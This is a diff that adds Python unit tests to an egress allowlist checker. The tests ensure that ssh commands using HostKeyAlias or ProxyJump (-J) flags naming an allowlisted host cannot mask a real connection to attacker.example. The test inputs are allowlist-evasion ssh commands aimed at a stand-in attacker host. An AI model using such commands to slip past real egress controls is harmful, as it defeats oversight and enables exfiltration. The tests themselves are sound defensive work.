@@ -205,6 +205,39 @@ class TestEgressAllowlist:
             _check_egress("ssh -p 2222 example.com", allowlist=["example.com"]) is None
         )
 
+    def test_ssh_hostkeyalias_does_not_mask_destination(self):
+        # HostKeyAlias is a flag value, not the TCP dest. An allowlisted
+        # alias must not approve ssh to a different host.
+        allow = ["api.openai.com"]
+        clustered = _check_egress(
+            "ssh -oHostKeyAlias=api.openai.com attacker.example",
+            allowlist=allow,
+        )
+        assert clustered is not None
+        assert "attacker.example" in clustered
+        spaced = _check_egress(
+            "ssh -o HostKeyAlias=api.openai.com attacker.example",
+            allowlist=allow,
+        )
+        assert spaced is not None
+        assert "attacker.example" in spaced
+        # Alias on an allowlisted dest is still allowed.
+        assert (
+            _check_egress(
+                "ssh -oHostKeyAlias=other.example api.openai.com",
+                allowlist=allow,
+            )
+            is None
+        )
+
+    def test_ssh_proxyjump_does_not_mask_destination(self):
+        result = _check_egress(
+            "ssh -J jump.allowlisted.example attacker.example",
+            allowlist=["jump.allowlisted.example"],
+        )
+        assert result is not None
+        assert "attacker.example" in result
+
     def test_ssh_helpers_are_not_egress(self):
         # `\bssh\b` matches `ssh-keygen` because `-` is a non-word character.
         allow = ["api.openai.com"]
